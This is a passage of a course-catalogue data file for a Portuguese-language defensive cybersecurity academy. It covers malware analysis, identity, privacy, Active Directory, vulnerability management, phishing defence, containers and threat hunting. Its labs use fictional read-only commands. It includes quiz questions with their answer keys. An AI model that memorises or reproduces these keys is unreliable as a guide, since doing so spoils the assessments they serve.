      { id: "netsec-3", prompt: "Logs DNS são úteis para:", options: ["Investigar resolução de nomes e padrões de comunicação", "Criar permissões", "Substituir backups", "Ocultar eventos"], correctAnswer: 0, explanation: "Consultas DNS fornecem contexto sobre destinos e comportamentos de comunicação." },
      { id: "netsec-4", prompt: "Acesso administrativo seguro deve incluir:", options: ["MFA, menor privilégio e registro", "Conta compartilhada", "Acesso público", "Ausência de auditoria"], correctAnswer: 0, explanation: "Controles combinados reduzem risco e fornecem rastreabilidade." },
      { id: "netsec-5", prompt: "Uma anomalia de rede deve ser tratada inicialmente como:", options: ["Sinal que requer contexto e investigação", "Confirmação automática de incidente", "Motivo para apagar logs", "Um detalhe irrelevante"], correctAnswer: 0, explanation: "Sinais precisam ser enriquecidos para evitar conclusões precipitadas." },
    ],
  },
  {
    slug: "malware-analysis-fundamentals", code: "MAL-01", title: "Análise de Malware — Fundamentos", shortTitle: "Análise de Malware", level: "Intermediário", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "green", icon: "shield",
    description: "Classificação segura de artefatos, IOCs, comportamento e comunicação de achados em laboratório isolado.", focus: "Análise defensiva e responsável baseada em observação, ambiente isolado e integração com inteligência de ameaças.",
    outcomes: ["Reconhecer limites e cuidados de um ambiente de análise seguro.", "Diferenciar indicadores estáticos e comportamentais.", "Transformar observações em contexto útil para detecção e resposta."],
    modules: [
      { title: "Segurança e escopo da análise", lessons: 4, description: "Ambiente isolado, autorização, preservação e limites de observação." },
      { title: "Indicadores e comportamento", lessons: 4, description: "Hashes, nomes, rede, processos e correlação de sinais." },
      { title: "Comunicação defensiva", lessons: 4, description: "Relatórios, IOCs, confiança da evidência e regras de detecção." },
    ],
    labsList: [
      { title: "Classificação de artefato", description: "Registre indicadores de um arquivo fictício em ambiente de treinamento.", objective: "Documentar observações sem executar conteúdo ou extrapolar conclusões.", command: "classificar-artefato --amostra treino-01 --ambiente isolado", output: "Hash: registrado\nTipo: executável de treinamento\nAção: correlacionar com telemetria antes de classificar ameaça" },
      { title: "Pacote de indicadores", description: "Monte uma entrega de IOCs para uma equipe de detecção.", objective: "Separar indicadores observados, contexto e nível de confiança.", command: "preparar-iocs --caso MAL-LAB-05 --confianca media", output: "Indicadores: hash, domínio e processo\nContexto: laboratório isolado\nConfiança: média\nDestino: equipe de detecção" },
    ],
    assessment: "Avaliação de análise segura, indicadores, comportamento e comunicação defensiva.",
    assessmentQuestions: [
      { id: "mal-1", prompt: "Uma análise de malware responsável deve ocorrer em:", options: ["Ambiente autorizado e isolado", "Computador pessoal sem proteção", "Rede de produção", "Qualquer dispositivo público"], correctAnswer: 0, explanation: "Isolamento e autorização reduzem risco e preservam o escopo defensivo da atividade." },
      { id: "mal-2", prompt: "Um hash de arquivo é um exemplo de:", options: ["Indicador estático", "Permissão administrativa", "Política de RH", "Método de backup"], correctAnswer: 0, explanation: "Hashes podem identificar uma amostra específica, embora precisem de contexto para interpretação." },
      { id: "mal-3", prompt: "Um indicador comportamental pode ser:", options: ["Processo e conexão de rede observados", "Cor da tela", "Nome do time", "Tamanho do teclado"], correctAnswer: 0, explanation: "Comportamentos observados em processos e comunicações ajudam a entender a atividade." },
      { id: "mal-4", prompt: "Ao compartilhar IOCs, é importante incluir:", options: ["Contexto e nível de confiança", "Somente uma suposição", "Credenciais", "Dados sem fonte"], correctAnswer: 0, explanation: "Contexto e confiança permitem que outras equipes usem os indicadores de modo adequado." },
      { id: "mal-5", prompt: "Uma regra de detecção baseada em IOC deve:", options: ["Ser revisada e contextualizada", "Ser aplicada sem monitoramento", "Substituir investigação", "Eliminar telemetria"], correctAnswer: 0, explanation: "IOCs podem expirar ou gerar falsos positivos, por isso exigem acompanhamento e revisão." },
    ],
  },
  {
    slug: "identidade-autenticacao-segura", code: "IAM-01", title: "Identidade e Autenticação Segura", shortTitle: "Identidade Segura", level: "Iniciante", duration: "12 horas", lessons: 12, labs: 2, quizCount: 5, accent: "cyan", icon: "shield",
    description: "Senhas, MFA, autorização e ciclo de vida de acessos para começar a proteger contas com contexto.", focus: "Fundamentos de identidade digital e autenticação aplicados a cenários de estudo e trabalho.",
    outcomes: ["Diferenciar autenticação, autorização e auditoria.", "Escolher controles proporcionais para senhas, MFA e recuperação de conta.", "Reconhecer o ciclo de concessão, revisão e revogação de acessos."],
    modules: [
      { title: "Identidade como perímetro", lessons: 4, description: "Contas, papéis, autenticação, autorização e rastreabilidade de acesso." },
      { title: "Senhas e múltiplos fatores", lessons: 4, description: "Passphrases, gerenciadores, MFA, fatores de verificação e recuperação segura." },
      { title: "Ciclo de vida do acesso", lessons: 4, description: "Menor privilégio, revisão periódica, desligamento e tratamento de exceções." },
    ],
    labsList: [
      { title: "Revisão de autenticação", description: "Avalie os controles de uma conta simulada de colaborador.", objective: "Identificar como MFA e recuperação controlada reduzem risco sem alterar uma conta real.", command: "revisar-autenticacao --perfil colaborador --mfa obrigatorio", output: "MFA: obrigatório\nRecuperação: aprovada por segundo fator\nSenha: protegida por gerenciador\nResultado: controles básicos atendidos" },
      { title: "Mapa de menor privilégio", description: "Compare permissões de papéis em uma intranet de treinamento.", objective: "Selecionar somente os acessos necessários para a função simulada.", command: "auditar-acesso --sistema intranet-treino --somente-leitura", output: "Perfil: analista júnior\nAcesso necessário: leitura de relatórios\nAcesso excessivo: administração removida do plano\nAção: registrar revisão" },
    ],
    assessment: "Avaliação de autenticação, MFA, menor privilégio e ciclo de vida de acessos.",
    assessmentQuestions: [
      { id: "iam-1", prompt: "Autenticação responde principalmente à pergunta:", options: ["Quem está tentando acessar?", "O que a pessoa pode fazer?", "Qual backup usar?", "Qual rede usar?"], correctAnswer: 0, explanation: "Autenticação verifica a identidade; autorização define o que a identidade pode acessar." },
      { id: "iam-2", prompt: "Qual medida reduz o impacto de uma senha vazada?", options: ["MFA", "Conta compartilhada", "Desativar logs", "Usar a mesma senha"], correctAnswer: 0, explanation: "MFA adiciona uma verificação além da senha e reduz o risco de uso indevido isolado." },
      { id: "iam-3", prompt: "Menor privilégio significa:", options: ["Conceder apenas o acesso necessário", "Dar acesso de administrador a todos", "Remover registros", "Compartilhar contas"], correctAnswer: 0, explanation: "O princípio limita permissões para reduzir a superfície de impacto." },
      { id: "iam-4", prompt: "Uma revisão de acesso é especialmente importante quando:", options: ["Uma pessoa muda de função ou sai da organização", "A tela muda de cor", "Um backup é criado", "A conexão está rápida"], correctAnswer: 0, explanation: "Mudanças no vínculo ou na função exigem ajuste ou revogação de permissões." },
      { id: "iam-5", prompt: "Um gerenciador de senhas ajuda principalmente a:", options: ["Criar e guardar senhas fortes e distintas", "Compartilhar credenciais em grupo", "Desativar MFA", "Evitar atualizações"], correctAnswer: 0, explanation: "Senhas únicas e longas reduzem o efeito de reutilização de credenciais." },
    ],
    videoLearning: {
      provider: "YouTube", label: "Trilha de vídeo complementar: Segurança da Informação", attribution: "Vídeos públicos do Curso em Vídeo incorporados como material complementar; a estrutura pedagógica, práticas e avaliações desta formação são autorais da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/playlist?list=PLHz_AreHm4dlaTyjolzCFC6IjLzO8O0XV", embedUrl: "https://www.youtube-nocookie.com/embed/videoseries?list=PLHz_AreHm4dlaTyjolzCFC6IjLzO8O0XV&rel=0",
      sessions: [
        { moduleIndex: 0, title: "Abertura: fundamentos de segurança", duration: "≈ 9 min", focus: "Observe os conceitos centrais de segurança e relacione-os a identidade digital.", chapters: [{ time: "00:00", title: "Identidade e ativo", summary: "Por que contas merecem o mesmo cuidado que outros ativos críticos." }, { time: "03:00", title: "Verificar antes de confiar", summary: "A autenticação estabelece quem está tentando acessar." }, { time: "06:00", title: "Aplicação no módulo", summary: "Registre um controle de identidade que reduziria risco no seu cenário." }], transcript: [{ time: "00:00", text: "Identidade digital conecta uma pessoa, serviço ou dispositivo às decisões de acesso." }, { time: "03:00", text: "Autenticar é verificar a identidade; autorizar é limitar o que essa identidade pode fazer." }, { time: "06:00", text: "Controles de identidade precisam de registro e revisão para continuarem confiáveis." }] },
        { moduleIndex: 1, title: "Contas, senhas e proteção", duration: "≈ 15 min", focus: "Anote três práticas que tornam uma conta mais resistente a acesso indevido.", chapters: [{ time: "00:00", title: "Senhas únicas", summary: "Como passphrases e gerenciadores reduzem reutilização de credenciais." }, { time: "05:00", title: "Múltiplos fatores", summary: "Um segundo fator reduz o impacto de uma senha exposta." }, { time: "10:00", title: "Recuperação segura", summary: "Recuperar acesso também precisa de verificações proporcionais." }], transcript: [{ time: "00:00", text: "Uma senha forte deve ser longa, única e protegida por um gerenciador confiável." }, { time: "05:00", text: "MFA combina evidências de posse, conhecimento ou característica para elevar a proteção." }, { time: "10:00", text: "Processos de recuperação não devem criar um atalho que contorne os controles principais." }] },
        { moduleIndex: 2, title: "Revisão de controles", duration: "≈ 18 min", focus: "Conecte acesso mínimo, registros e revisão periódica a um cenário profissional.", chapters: [{ time: "00:00", title: "Menor privilégio", summary: "Conceda apenas a permissão necessária para a função atual." }, { time: "06:00", title: "Revisão de acessos", summary: "Mudanças de função e desligamentos exigem revisão rápida." }, { time: "12:00", title: "Evidências", summary: "Registros tornam a decisão auditável e apoiam investigações." }], transcript: [{ time: "00:00", text: "Menor privilégio reduz a superfície de impacto de um erro ou comprometimento." }, { time: "06:00", text: "Acessos temporários e exceções devem ter responsável, prazo e revisão documentada." }, { time: "12:00", text: "Logs de acesso fornecem contexto para demonstrar quem fez uma ação e quando." }] },
      ],
    },
  },
  {
    slug: "privacidade-protecao-dados", code: "PRIV-01", title: "Privacidade e Proteção de Dados", shortTitle: "Privacidade", level: "Iniciante", duration: "12 horas", lessons: 12, labs: 2, quizCount: 5, accent: "green", icon: "shield",
    description: "Dados pessoais, classificação, privacidade por padrão e decisões responsáveis no dia a dia digital.", focus: "Proteção prática de dados e comunicação responsável sobre privacidade.",
    outcomes: ["Reconhecer dados pessoais e informações sensíveis em cenários cotidianos.", "Aplicar classificação e minimização de dados a processos simples.", "Relacionar consentimento, finalidade e retenção a decisões de segurança."],
    modules: [
      { title: "Dados e contexto", lessons: 4, description: "Dados pessoais, sensíveis, classificações e riscos de exposição indevida." },
      { title: "Privacidade por padrão", lessons: 4, description: "Minimização, finalidade, transparência e configurações seguras por padrão." },
      { title: "Ciclo de vida e comunicação", lessons: 4, description: "Coleta, retenção, descarte e comunicação responsável com titulares e equipes." },
    ],
    labsList: [
      { title: "Classificação de registros", description: "Classifique exemplos fictícios de dados de uma organização.", objective: "Escolher proteção proporcional sem consultar ou mover dados reais.", command: "classificar-dados --amostra cadastro-treino --politica interna", output: "Registros: 5\nDados pessoais: 3\nDados sensíveis: 1\nAção: restringir acesso e registrar finalidade" },
      { title: "Revisão de retenção", description: "Avalie um fluxo fictício de armazenamento de dados.", objective: "Identificar quando uma informação deve ser mantida, anonimizada ou descartada conforme a política simulada.", command: "revisar-retencao --processo evento-treino --somente-leitura", output: "Finalidade: concluída\nPrazo de retenção: vencido\nRecomendação: descarte seguro conforme política\nStatus: revisão registrada" },
    ],
    assessment: "Avaliação de classificação, minimização, retenção e proteção de dados pessoais.",
    assessmentQuestions: [
      { id: "priv-1", prompt: "Minimização de dados significa:", options: ["Coletar apenas o necessário para a finalidade", "Guardar todos os dados para sempre", "Publicar registros", "Eliminar controles"], correctAnswer: 0, explanation: "Coletar somente o necessário reduz exposição e facilita o tratamento responsável." },
      { id: "priv-2", prompt: "Classificar dados ajuda a:", options: ["Aplicar controles proporcionais à sensibilidade", "Substituir backups", "Desativar auditoria", "Evitar documentação"], correctAnswer: 0, explanation: "A classificação orienta quem pode acessar e como proteger cada informação." },
      { id: "priv-3", prompt: "Uma finalidade clara deve existir antes de:", options: ["Coletar e usar dados", "Apagar logs", "Criar uma VLAN", "Abrir um chamado"], correctAnswer: 0, explanation: "A finalidade orienta a necessidade e os limites de tratamento da informação." },
      { id: "priv-4", prompt: "Após o fim do prazo definido, a prática adequada é:", options: ["Revisar e descartar ou anonimizar conforme a política", "Manter sem critério", "Enviar a terceiros", "Remover rastreabilidade"], correctAnswer: 0, explanation: "A retenção deve ser limitada e documentada para reduzir exposição desnecessária." },
      { id: "priv-5", prompt: "Privacidade por padrão busca:", options: ["Configurações que protejam dados desde o início", "Acesso público por padrão", "Senhas compartilhadas", "Sem registros"], correctAnswer: 0, explanation: "Proteções habilitadas desde o desenho diminuem erros e dependência de ações posteriores." },
    ],
  },
  {
    slug: "active-directory-security", code: "AD-SEC-01", title: "Active Directory Security", shortTitle: "AD Security", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "blue", icon: "cpu",
    description: "Identidades, grupos, políticas, delegação e auditoria para fortalecer diretórios corporativos.", focus: "Defesa de identidades corporativas com revisão de privilégios e telemetria.",
    outcomes: ["Mapear grupos e privilégios que exigem revisão prioritária.", "Relacionar GPOs, delegação e auditoria a controles de identidade.", "Comunicar um achado de acesso excessivo com evidências e recomendação."],
    modules: [
      { title: "Estrutura e identidade corporativa", lessons: 4, description: "Domínios, unidades organizacionais, grupos, contas de serviço e confiança." },
      { title: "Privilégios e políticas", lessons: 5, description: "Delegação, grupos privilegiados, GPOs, MFA e administração responsável." },
      { title: "Auditoria e resposta", lessons: 5, description: "Eventos de autenticação, revisão de mudanças e triagem de comportamentos incomuns." },
    ],
    labsList: [
      { title: "Inventário de grupos", description: "Analise grupos privilegiados de um diretório simulado.", objective: "Identificar contas que precisam de revisão sem alterar qualquer diretório real.", command: "inventariar-ad --grupos privilegiados --somente-leitura", output: "Grupos avaliados: 4\nContas com privilégio elevado: 6\nConta legada identificada: svc-relatorio\nAção: solicitar revisão formal" },
      { title: "Linha do tempo de logon", description: "Correlacione eventos de autenticação no cenário de treinamento.", objective: "Distinguir alteração legítima de um padrão que merece escalonamento.", command: "correlacionar-ad --eventos logon,grupo --janela 8h", output: "Mudança de grupo: registrada\nOrigem: estação administrativa\nAprovação: ausente\nPróximo passo: preservar evidência e escalar" },
    ],
    assessment: "Avaliação de privilégios, políticas, auditoria e resposta em Active Directory.",
    assessmentQuestions: [
      { id: "ad-1", prompt: "Grupos privilegiados devem ser revisados porque:", options: ["Concentram impacto elevado sobre sistemas", "Eliminam a necessidade de logs", "Substituem MFA", "Não têm relação com acesso"], correctAnswer: 0, explanation: "Permissões elevadas exigem necessidade clara, revisão e rastreabilidade." },
      { id: "ad-2", prompt: "Uma GPO é usada principalmente para:", options: ["Aplicar configurações e políticas de forma consistente", "Apagar evidências", "Criar backups", "Substituir grupos"], correctAnswer: 0, explanation: "Políticas centralizadas ajudam a aplicar padrões de segurança em endpoints e usuários." },
      { id: "ad-3", prompt: "Uma conta de serviço deve ter:", options: ["Permissões mínimas e uso documentado", "Acesso de administrador irrestrito", "Senha compartilhada", "Logs desativados"], correctAnswer: 0, explanation: "Contas de serviço precisam de finalidade, escopo e privilégios controlados." },
      { id: "ad-4", prompt: "Diante de uma mudança de grupo sem aprovação, a primeira ação é:", options: ["Preservar contexto e seguir o processo de triagem", "Apagar o evento", "Ignorar o alerta", "Alterar contas aleatoriamente"], correctAnswer: 0, explanation: "A investigação começa com evidência, contexto e escalonamento conforme o processo definido." },
      { id: "ad-5", prompt: "Delegação segura busca:", options: ["Conceder somente a administração necessária", "Dar controle total a todos", "Remover auditoria", "Usar contas compartilhadas"], correctAnswer: 0, explanation: "Delegação limitada reduz exposição e preserva responsabilidades claras." },
    ],
  },
  {
    slug: "vulnerability-management", code: "VM-01", title: "Gestão de Vulnerabilidades", shortTitle: "Vulnerabilidades", level: "Intermediário", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "purple", icon: "shield",
    description: "Inventário, priorização, correção e verificação de vulnerabilidades em um ciclo defensivo contínuo.", focus: "Decisões de remediação baseadas em exposição, contexto e evidências.",
    outcomes: ["Diferenciar vulnerabilidade, exposição, ameaça e risco.", "Priorizar correções considerando criticidade e contexto do ativo.", "Registrar exceções, evidências e validação pós-correção."],
    modules: [
      { title: "Inventário e descoberta", lessons: 4, description: "Ativos, superfícies expostas, fontes de informação e qualidade de inventário." },
      { title: "Risco e priorização", lessons: 4, description: "Criticidade, exposição, exploração conhecida e impacto no negócio." },
      { title: "Remediação e verificação", lessons: 4, description: "Correção, compensação, exceções aprovadas e validação com evidências." },
    ],
    labsList: [
      { title: "Triagem de achados", description: "Priorize achados fictícios de uma varredura de treinamento.", objective: "Usar contexto do ativo e exposição sem executar qualquer varredura em redes reais.", command: "priorizar-achados --arquivo inventario-treino.json --contexto negocio", output: "Achados: 5\nPrioridade alta: serviço externo crítico\nPrioridade média: ativo interno sem dados sensíveis\nAção: abrir plano de correção" },
      { title: "Verificação de correção", description: "Avalie evidências pós-correção de um cenário simulado.", objective: "Confirmar a remediação registrada antes do encerramento do achado.", command: "validar-correcao --caso VM-LAB-03 --evidencia homologacao", output: "Mudança: documentada\nTeste em homologação: aprovado\nEvidência: anexada\nStatus: pronto para revisão de encerramento" },
    ],
    assessment: "Avaliação de inventário, priorização, remediação e verificação de vulnerabilidades.",
    assessmentQuestions: [
      { id: "vm-1", prompt: "Uma vulnerabilidade deve ser priorizada considerando:", options: ["Exposição, criticidade e contexto do ativo", "Apenas a cor do alerta", "Somente a idade do sistema", "A opinião de uma pessoa"], correctAnswer: 0, explanation: "Risco depende do contexto, do impacto e da possibilidade de exploração, não de um único fator." },
      { id: "vm-2", prompt: "O inventário de ativos é importante porque:", options: ["Mostra o que precisa ser protegido e avaliado", "Elimina correções", "Substitui backups", "Desativa logs"], correctAnswer: 0, explanation: "Sem saber quais ativos existem e seu contexto, não há priorização consistente." },
      { id: "vm-3", prompt: "Uma exceção de correção deve:", options: ["Ser aprovada, registrada e revisada", "Ser esquecida", "Remover o achado sem evidência", "Ser compartilhada externamente"], correctAnswer: 0, explanation: "Exceções precisam de responsabilidade, justificativa e prazo de revisão." },
      { id: "vm-4", prompt: "Validar uma correção significa:", options: ["Confirmar com evidência que o risco foi tratado", "Assumir que a mudança funcionou", "Apagar o histórico", "Ignorar homologação"], correctAnswer: 0, explanation: "A verificação evita encerrar achados sem comprovar o resultado da remediação." },
      { id: "vm-5", prompt: "Um controle compensatório é útil quando:", options: ["A correção definitiva não pode ser aplicada imediatamente", "Não há nenhum risco", "Não existem ativos", "MFA deve ser removido"], correctAnswer: 0, explanation: "Controles temporários podem reduzir risco enquanto a solução definitiva é planejada." },
    ],
  },
  {
    slug: "email-security-phishing-defense", code: "EMAIL-SEC-01", title: "Segurança de E-mail e Defesa contra Phishing", shortTitle: "E-mail Seguro", level: "Intermediário", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "green", icon: "network",
    description: "Proteção de e-mail, autenticação de domínio, triagem e resposta a mensagens suspeitas.", focus: "Detecção responsável de engenharia social e fortalecimento de comunicações corporativas.",
    outcomes: ["Reconhecer sinais comuns de mensagens suspeitas sem clicar em links ou anexos.", "Explicar o papel de autenticação de domínio e filtragem de e-mail.", "Registrar e escalar uma ocorrência com o contexto necessário."],
    modules: [
      { title: "Ameaças no correio eletrônico", lessons: 4, description: "Phishing, spear phishing, anexos, URLs, urgência e engenharia social." },
      { title: "Autenticação e proteção", lessons: 4, description: "SPF, DKIM, DMARC, filtros, quarentena e proteção de contas." },
      { title: "Triagem e comunicação", lessons: 4, description: "Preservação de contexto, reporte, investigação e aprendizado contínuo." },
    ],
    labsList: [
      { title: "Triagem de mensagem", description: "Analise uma mensagem fictícia em ambiente de treinamento.", objective: "Identificar sinais de risco sem abrir links, anexos ou conteúdo externo.", command: "triar-email --amostra alerta-treino.eml --sem-abrir-anexos", output: "Remetente: domínio semelhante\nURL: destino divergente\nSinal: urgência incomum\nAção: reportar para análise" },
      { title: "Revisão de domínio", description: "Observe o status de autenticação de um domínio simulado.", objective: "Relacionar controles de domínio a redução de falsificação de remetente.", command: "revisar-dominio-email --dominio academy.local --somente-leitura", output: "SPF: configurado\nDKIM: assinatura válida\nDMARC: política de quarentena\nStatus: controles registrados" },
    ],
    assessment: "Avaliação de phishing, autenticação de domínio, triagem e comunicação de incidentes por e-mail.",
    assessmentQuestions: [
      { id: "email-1", prompt: "Diante de um e-mail suspeito, a postura adequada é:", options: ["Reportar e evitar clicar em links ou anexos", "Responder com dados pessoais", "Encaminhar sem contexto", "Desativar filtros"], correctAnswer: 0, explanation: "Preservar a mensagem e reportar permite análise sem ampliar o risco." },
      { id: "email-2", prompt: "SPF, DKIM e DMARC ajudam principalmente a:", options: ["Reduzir falsificação de domínio no e-mail", "Substituir MFA", "Apagar mensagens", "Criar uma VPN"], correctAnswer: 0, explanation: "Esses controles apoiam a autenticação de remetentes e políticas de tratamento." },
      { id: "email-3", prompt: "Um sinal frequente de phishing é:", options: ["Urgência incomum combinada com destino suspeito", "Uma política documentada", "Um backup testado", "MFA habilitado"], correctAnswer: 0, explanation: "Pressão, links divergentes e domínios parecidos merecem atenção e validação." },
      { id: "email-4", prompt: "Quarentena de mensagens serve para:", options: ["Reter conteúdo suspeito para revisão", "Desativar toda proteção", "Publicar anexos", "Eliminar logs"], correctAnswer: 0, explanation: "A quarentena reduz exposição enquanto permite investigação controlada." },
      { id: "email-5", prompt: "Ao reportar uma mensagem suspeita, inclua:", options: ["Remetente, horário e motivo da suspeita", "Sua senha", "Dados pessoais de terceiros", "Somente uma opinião"], correctAnswer: 0, explanation: "Contexto e evidências ajudam a equipe responsável a investigar e orientar os usuários." },
    ],
  },
  {
    slug: "container-security", code: "CONT-SEC-01", title: "Segurança de Containers", shortTitle: "Containers", level: "Intermediário", duration: "16 horas", lessons: 14, labs: 2, quizCount: 5, accent: "blue", icon: "terminal",
    description: "Imagens, registros, segredos, permissões e observabilidade para workloads em containers.", focus: "Práticas de desenvolvimento e operação segura em ambientes de containerização.",
    outcomes: ["Diferenciar imagem, container, registro e orquestração em uma perspectiva de segurança.", "Identificar controles para imagens, segredos e permissões de runtime.", "Aplicar checklist de revisão sem implantar workloads reais."],
    modules: [
      { title: "Fundamentos de workloads", lessons: 4, description: "Imagens, containers, registros, dependências e superfícies de execução." },
      { title: "Construção e configuração segura", lessons: 5, description: "Imagens mínimas, atualização de dependências, segredos e permissões restritas." },
      { title: "Runtime e observabilidade", lessons: 5, description: "Políticas, logs, monitoramento, segmentação e resposta a desvios." },
    ],
    labsList: [
      { title: "Checklist de imagem", description: "Revise uma imagem fictícia antes de seu uso no ambiente de teste.", objective: "Identificar controles de origem, dependências e usuário de execução sem criar containers reais.", command: "revisar-imagem --projeto api-treino --perfil seguro", output: "Origem: registro aprovado\nUsuário root: não utilizado\nDependências: revisão pendente\nAção: corrigir antes da publicação" },
      { title: "Política de runtime", description: "Avalie uma política simulada de execução de container.", objective: "Relacionar menor privilégio, segredos protegidos e logs a uma execução controlada.", command: "validar-runtime --ambiente homologacao --somente-leitura", output: "Privilégios: restritos\nSegredos: injetados por cofre\nLogs: centralizados\nResultado: política aprovada" },
    ],
    assessment: "Avaliação de imagens, segredos, permissões, políticas e observabilidade de containers.",
    assessmentQuestions: [
      { id: "cont-1", prompt: "Uma imagem de container deve vir preferencialmente de:", options: ["Registro aprovado e rastreável", "Fonte desconhecida", "Anexo de e-mail", "Computador pessoal sem revisão"], correctAnswer: 0, explanation: "Origem confiável e rastreável reduz risco de componentes indevidos." },
      { id: "cont-2", prompt: "Executar um container como usuário não privilegiado ajuda a:", options: ["Reduzir impacto de comprometimento", "Eliminar logs", "Publicar segredos", "Substituir testes"], correctAnswer: 0, explanation: "Menos privilégios limitam ações possíveis caso o workload seja comprometido." },
      { id: "cont-3", prompt: "Segredos de aplicação devem ser:", options: ["Gerenciados fora da imagem e do código", "Incluídos na imagem", "Enviados por chat", "Compartilhados livremente"], correctAnswer: 0, explanation: "Cofres e mecanismos de injeção evitam exposição em repositórios e imagens." },
      { id: "cont-4", prompt: "Logs de runtime são úteis para:", options: ["Detectar desvios e apoiar investigação", "Eliminar observabilidade", "Evitar atualizações", "Substituir políticas"], correctAnswer: 0, explanation: "Telemetria de execução permite observar comportamento e responder de modo fundamentado." },
      { id: "cont-5", prompt: "Uma imagem mínima contribui para:", options: ["Reduzir componentes e superfície de ataque", "Aumentar privilégios", "Desativar revisão", "Remover documentação"], correctAnswer: 0, explanation: "Menos componentes podem significar menos dependências e exposição a vulnerabilidades." },
    ],
  },
  {
    slug: "threat-hunting-avancado", code: "HUNT-ADV-01", title: "Threat Hunting Avançado", shortTitle: "Threat Hunting", level: "Avançado", duration: "18 horas", lessons: 15, labs: 2, quizCount: 5, accent: "cyan", icon: "network",
    description: "Hipóteses, telemetria, correlação e comunicação de achados para caça defensiva baseada em evidências.", focus: "Investigação proativa responsável em dados de treinamento e ambientes autorizados.",
    outcomes: ["Construir hipóteses investigáveis a partir de cenários e comportamentos.", "Selecionar fontes de telemetria adequadas para validar uma hipótese.", "Diferenciar observação, inferência e conclusão na comunicação de achados."],
    modules: [
      { title: "Hipóteses e contexto", lessons: 5, description: "Perguntas investigáveis, contexto de negócio, TTPs e critérios de encerramento." },
      { title: "Telemetria e correlação", lessons: 5, description: "Logs de identidade, endpoint, rede e nuvem em linhas do tempo defensivas." },
      { title: "Achados e melhoria", lessons: 5, description: "Evidências, confiança, regras de detecção, métricas e retroalimentação do SOC." },
    ],
    labsList: [
      { title: "Hipótese de comportamento", description: "Formule uma hipótese defensiva para uma atividade de treinamento.", objective: "Selecionar fontes de dados e critérios de validação sem investigar ambientes externos.", command: "formular-hipotese --cenario acesso-incomum --fontes identidade,endpoint", output: "Hipótese: uso atípico de credencial\nFontes: logon e processo\nCritério: origem, horário e privilégio\nStatus: pronto para validação" },
      { title: "Linha do tempo correlacionada", description: "Relacione eventos fictícios de endpoint e autenticação.", objective: "Separar dados observados de interpretação e indicar o próximo passo defensivo.", command: "correlacionar-telemetria --caso HUNT-LAB-02 --janela 2h", output: "Eventos correlacionados: 4\nObservação: logon seguido de processo incomum\nConfiança: média\nAção: abrir investigação documentada" },
    ],
    assessment: "Avaliação de hipóteses, telemetria, correlação e comunicação de threat hunting.",
    assessmentQuestions: [
      { id: "hunt-1", prompt: "Uma hipótese de hunting de qualidade deve ser:", options: ["Investigável com fontes de dados e critérios claros", "Uma acusação sem evidência", "Um comando de ataque", "Uma substituição de logs"], correctAnswer: 0, explanation: "Hipóteses precisam ser testáveis e orientadas por telemetria disponível." },
      { id: "hunt-2", prompt: "Correlacionar telemetria significa:", options: ["Relacionar eventos para ganhar contexto", "Apagar fontes de dados", "Assumir malícia automaticamente", "Desativar alertas"], correctAnswer: 0, explanation: "A correlação busca contexto para reduzir conclusões isoladas e aumentar a qualidade da análise." },
      { id: "hunt-3", prompt: "A confiança de um achado deve:", options: ["Refletir a qualidade e as limitações das evidências", "Ser sempre máxima", "Ser omitida", "Depender da aparência do alerta"], correctAnswer: 0, explanation: "Comunicar confiança e limitações permite decisões mais responsáveis." },
      { id: "hunt-4", prompt: "Uma regra de detecção criada após um achado deve:", options: ["Ser validada e acompanhada", "Ser aplicada sem revisão", "Substituir a investigação", "Eliminar logs"], correctAnswer: 0, explanation: "Regras precisam de validação para reduzir falso positivo e manter relevância." },
      { id: "hunt-5", prompt: "O limite ético da atividade de hunting é:", options: ["Usar dados e ambientes autorizados", "Coletar dados de qualquer pessoa", "Acessar sistemas externos", "Ignorar políticas"], correctAnswer: 0, explanation: "A prática defensiva exige autorização, propósito definido e respeito a políticas de privacidade." },
    ],
    videoLearning: {
      provider: "YouTube", label: "Trilha SOC em vídeo: Threat Hunting", attribution: "Vídeo público externo sobre threat hunting incorporado como material complementar; o conteúdo audiovisual pode estar em inglês. Os capítulos, transcrições de apoio, exercícios e avaliações são autorais da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/watch?v=VNp35Uw_bSM", embedUrl: "https://www.youtube-nocookie.com/embed/VNp35Uw_bSM?rel=0",
      sessions: [
        { moduleIndex: 0, title: "Hipóteses que podem ser testadas", duration: "≈ 14 min", focus: "Partir de comportamento, contexto e critérios de validação em vez de assumir uma conclusão.", chapters: [{ time: "00:00", title: "Hunting proativo", summary: "Entenda o papel de perguntas investigáveis na defesa." }, { time: "05:00", title: "Escopo autorizado", summary: "Delimite ambiente, dados e objetivo da investigação." }, { time: "10:00", title: "Critério de encerramento", summary: "Defina o que confirma, enfraquece ou torna a hipótese inconclusiva." }], transcript: [{ time: "00:00", text: "Threat hunting é uma investigação proativa orientada por hipóteses; ele busca sinais que a automação pode não ter destacado." }, { time: "05:00", text: "A atividade precisa de propósito, autorização e escopo claros para proteger pessoas, dados e a operação." }, { time: "10:00", text: "Critérios de validação e encerramento evitam investigações sem foco e tornam os resultados mais úteis para o SOC." }] },
        { moduleIndex: 1, title: "Telemetria com propósito", duration: "≈ 16 min", focus: "Selecionar fontes de dados que possam responder à hipótese com contexto e limites conhecidos.", chapters: [{ time: "00:00", title: "Fonte e pergunta", summary: "Associe cada dado a uma decisão de investigação." }, { time: "06:00", title: "Correlacionar sem concluir", summary: "Relacione eventos sem transformar relação em prova automática." }, { time: "12:00", title: "Linha do tempo", summary: "Organize observações por tempo e fonte para revisão." }], transcript: [{ time: "00:00", text: "Telemetria útil é aquela que pode ajudar a responder uma pergunta de segurança, com procedência e contexto preservados." }, { time: "06:00", text: "Correlações ampliam contexto, mas ainda precisam de validação antes que uma equipe declare uma atividade como maliciosa." }, { time: "12:00", text: "A linha do tempo defensiva permite que outras pessoas revisem a sequência observada e os limites da interpretação." }] },
